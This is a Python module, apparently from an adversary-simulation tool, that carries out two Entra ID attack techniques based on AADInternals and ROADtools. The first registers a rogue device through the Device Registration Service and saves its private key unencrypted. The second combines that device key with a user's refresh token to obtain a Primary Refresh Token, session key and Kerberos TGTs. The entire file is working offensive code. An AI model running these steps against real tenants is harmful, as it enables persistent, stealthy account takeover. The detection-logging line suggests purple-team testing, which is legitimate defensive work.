import base64
import json
import logging
import struct
import time
import uuid
from datetime import datetime, timedelta

import requests
from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend
from cryptography.x509.oid import NameOID
import jwt

BCRYPT_RSAPUBLIC_MAGIC = 0x31415352  # 'RSA1'


def _build_transport_key_blob(public_key):
    # DRS expects the TransportKey as a base64 Windows CNG BCRYPT_RSAPUBLIC_BLOB,
    # not a PEM/DER key. AADInternals reuses the device's own key pair for this
    # which is what we do here too.
    # https://github.com/Gerenios/AADInternals/blob/master/PRT_Utils.ps1#L98
    numbers = public_key.public_numbers()
    modulus = numbers.n.to_bytes((numbers.n.bit_length() + 7) // 8, "big")
    exponent = numbers.e.to_bytes((numbers.e.bit_length() + 7) // 8, "big")

    header = struct.pack(
        "<6I",
        BCRYPT_RSAPUBLIC_MAGIC,
        len(modulus) * 8,  # BitLength
        len(exponent),     # cbPublicExp
        len(modulus),      # cbModulus
        0,                 # cbPrime1 (unused for public key)
        0,                 # cbPrime2 (unused for public key)
    )
    return base64.b64encode(header + exponent + modulus).decode()


def register_device(auth_config, params, token=False):
    """
    Registers a new device object in Entra ID via the Device Registration Service (DRS)

    Requires an access token scoped for the Device Registration Service
    Based on AADInternals PRT_Utils.ps1 register_device function
	https://github.com/Gerenios/AADInternals/blob/master/PRT_Utils.ps1
    """
    logging.info("Running the register_device technique")

    access_token = token.get("access_token") if token else None
    if not access_token:
        logging.error("A DRS-scoped access token is required to register a device.")
        return

    tenant_domain = params.get("tenant_domain")
    if not tenant_domain:
        logging.error("tenant_domain parameter is required (e.g. contoso.onmicrosoft.com).")
        return

    device_name = params.get("device_name", "DESKTOP-MSINVADER")
    os_version = params.get("os_version", "10.0.19041.928")
    join_type = params.get("join_type", 4)  # 4 = Azure AD register, 0 = Azure AD join

    device_id = str(uuid.uuid4())

    # This key pair is the device's identity going forward - it signs the CSR now
    # and later authenticates PRT requests, so it must be persisted, not discarded.
    private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)

    csr = (
        x509.CertificateSigningRequestBuilder()
        .subject_name(x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, device_id)]))
        .sign(private_key, hashes.SHA256())
    )
    csr_b64 = base64.b64encode(csr.public_bytes(serialization.Encoding.DER)).decode()

    url = "https://enterpriseregistration.windows.net/EnrollmentServer/device/?api-version=1.0"

    headers = {
        "Authorization": f"Bearer {access_token}",
        "Content-Type": "application/json; charset=utf-8",
    }

    transport_key_b64 = _build_transport_key_blob(private_key.public_key())

    body = {
        "CertificateRequest": {
            "Type": "pkcs10",
            "Data": csr_b64,
        },
        "Attributes": {
            "ReuseDevice": "True",
            "ReturnClientSid": "True",
            "SharedDevice": "False",
        },
        "TransportKey": transport_key_b64,
        "TargetDomain": tenant_domain,
        "DeviceDisplayName": device_name,
        "DeviceType": "Windows",
        "OSVersion": os_version,
        "JoinType": join_type,
    }

    try:
        response = requests.post(url, headers=headers, json=body)
    except Exception as e:
        logging.error(f"Exception during device registration: {e}")
        return

    if response.status_code not in (200, 201):
        logging.error(f"Device registration failed: {response.status_code} {response.text}")
        return

    result = response.json()
    cert_b64 = result.get("Certificate", {}).get("RawBody")
    returned_device_id = result.get("DeviceId", device_id)

    if not cert_b64:
        logging.error(f"Device registration response did not include a certificate: {result}")
        return

    key_path = params.get("key_out", f"{returned_device_id}_device.key")
    cert_path = params.get("cert_out", f"{returned_device_id}_device.p7b")

    with open(key_path, "wb") as f:
        f.write(private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption(),
        ))

    with open(cert_path, "wb") as f:
        f.write(base64.b64decode(cert_b64))

    logging.info(f"Registered device '{device_name}' with DeviceId {returned_device_id}")
    logging.info(f"Device private key saved to {key_path}, device certificate saved to {cert_path}")

    return {
        "device_id": returned_device_id,
        "private_key": private_key,
        "certificate_b64": cert_b64,
        "key_path": key_path,
        "cert_path": cert_path,
    }


def request_prt(params):
	"""
	Request a Primary Refresh Token (PRT) using device credentials + refresh token.

	Uses a devices certificate and private key
	plus a user's refresh token to authenticate and obtain a PRT + session key.

	Based on ROADtools deviceauth.py:
	https://github.com/dirkjanm/ROADtools/blob/master/roadlib/roadtools/roadlib/deviceauth.py:988

	"""
	logging.info("Running the request_prt technique")

	# Load device credentials
	key_path = params.get("key_path")
	cert_path = params.get("cert_path")
	session = params.get("session", "nosession")
	tenant_id = params.get("tenant_id", "common")
	refresh_token = params.get("refresh_token")

	if not key_path or not cert_path:
		logging.error("key_path and cert_path parameters are required")
		return

	# Load private key
	try:
		with open(key_path, "rb") as f:
			private_key_pem = f.read()
		private_key = serialization.load_pem_private_key(
			private_key_pem,
			password=None,
			backend=default_backend()
		)
	except Exception as e:
		logging.error(f"Failed to load private key from {key_path}: {e}")
		return

	# Load certificate
	try:
		with open(cert_path, "rb") as f:
			cert_data = f.read()
		try:
			certificate = x509.load_der_x509_certificate(cert_data, default_backend())
		except:
			logging.warning("Failed to parse certificate with cryptography, continuing with binary data")
			certificate = None
	except Exception as e:
		logging.error(f"Failed to load certificate from {cert_path}: {e}")
		return

	# Extract device ID from certificate subject
	device_id = None
	if certificate:
		try:
			for attr in certificate.subject:
				if attr.oid == x509.oid.NameOID.COMMON_NAME:
					device_id = attr.value
					break
		except Exception as e:
			logging.warning(f"Failed to extract device ID from certificate: {e}")

	if not device_id:
		logging.error("Could not extract device ID from certificate subject")
		return

	logging.info(f"Using device {device_id} to request PRT")

	# STEP 1: Get nonce via srv_challenge grant type
	# Following ROADtools approach
	logging.debug("Step 1: Requesting nonce via srv_challenge")

	token_endpoint = f"https://login.microsoftonline.com/{tenant_id}/oauth2/token"
	headers = {
		"Content-Type": "application/x-www-form-urlencoded",
		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
	}

	# AAD Broker Plugin client ID
	aad_broker_client_id = "29d9ed98-a469-4536-ade2-f981bc1d605e"

	# Request nonce
	nonce_body = {
		"grant_type": "srv_challenge",
		"windows_api_version": "2.0",
		"client_id": aad_broker_client_id,
	}

	try:
		nonce_response = requests.post(token_endpoint, headers=headers, data=nonce_body, timeout=10)
		if nonce_response.status_code != 200:
			logging.error(f"srv_challenge failed: {nonce_response.status_code}")
			logging.debug(f"Response: {nonce_response.text[:200]}")
			return

		nonce_data = nonce_response.json()
		nonce = nonce_data.get("Nonce")
		if not nonce:
			logging.error(f"No nonce received from srv_challenge")
			return

		logging.debug(f"Nonce obtained: {nonce[:20]}...")

	except Exception as e:
		logging.error(f"Exception during srv_challenge: {e}")
		return

	# STEP 2: Create signed JWT with device certificate
	logging.debug("Step 2: Creating signed JWT with refresh token + device certificate")

	try:
		os_version = "10.0.19041.868"  # Default Windows version

		# JWT payload per ROADtools deviceauth.py:988
		jwt_payload = {
			"client_id": aad_broker_client_id,
			"request_nonce": nonce,
			"scope": "openid aza ugs",
			"group_sids": [],
			"win_ver": os_version,
			"grant_type": "refresh_token",
			"refresh_token": refresh_token,  # User's refresh token - REQUIRED
		}

		# Include certificate in x5c header (base64-encoded, NOT as array for this flow)
		cert_b64 = base64.b64encode(cert_data).decode()

		# Sign JWT with device private key using RS256
		# Per ROADtools: x5c should be the cert, kdf_ver is required
		jwt_token = jwt.encode(
			jwt_payload,
			private_key,
			algorithm="RS256",
			headers={
				"x5c": cert_b64,
				"kdf_ver": 2,
			}
		)

		logging.debug(f"Device JWT created: {jwt_token[:80]}...")

	except Exception as e:
		logging.error(f"Failed to create device JWT: {e}")
		import traceback
		logging.error(traceback.format_exc())
		return

	# STEP 3: Submit signed JWT to get PRT
	logging.debug("Step 3: Submitting JWT to obtain PRT (refresh_token upgrade)")

	prt_body = {
		"windows_api_version": "2.2",
		"grant_type": "urn:ietf:params:oauth:grant-type:jwt-bearer",
		"request": jwt_token,
		"client_info": "1",
		"tgt": True,
	}

	try:
		prt_response = requests.post(token_endpoint, headers=headers, data=prt_body, timeout=10)
	except Exception as e:
		logging.error(f"Exception during PRT request: {e}")
		return

	# Check response
	if prt_response.status_code not in (200, 201):
		logging.error(f"PRT request failed: {prt_response.status_code}")
		try:
			error_response = prt_response.json()
			logging.error(f"Error: {error_response.get('error')}")
			logging.error(f"Error description: {error_response.get('error_description')}")
			logging.debug(f"Full response: {prt_response.text[:500]}")
		except:
			logging.error(f"Response: {prt_response.text[:200]}")
		return

	try:
		result = prt_response.json()
	except Exception as e:
		logging.error(f"Failed to parse PRT response: {e}")
		return

	# Extract PRT components from response
	session_key_jwe = result.get("session_key_jwe")
	tgt_ad = result.get("tgt_ad")
	tgt_cloud = result.get("tgt_cloud")
	refresh_token = result.get("refresh_token")

	if not session_key_jwe:
		logging.error(f"PRT response did not include session_key_jwe")
		logging.debug(f"Response keys: {list(result.keys())}")
		return

	# Determine output path
	prt_out = params.get("prt_out", f"{device_id}_prt.json")

	# Write PRT components to output file
	try:
		output = {
			"device_id": device_id,
			"session_key_jwe": session_key_jwe,
			"tgt_ad": tgt_ad,
			"tgt_cloud": tgt_cloud,
			"refresh_token": refresh_token,
			"id_token": result.get("id_token"),
			"obtained_at": datetime.utcnow().isoformat(),
			"expires_at": (datetime.utcnow() + timedelta(hours=1)).isoformat(),
		}

		with open(prt_out, "w") as f:
			json.dump(output, f, indent=2)

		logging.info(f"Successfully obtained PRT for device {device_id}")
		logging.info(f"Session key and TGTs saved to {prt_out}")
		logging.info(f"[DETECTION] Device {device_id} obtained PRT via certificate + refresh_token")

		return output

	except Exception as e:
		logging.error(f"Failed to write PRT output to {prt_out}: {e}")
		return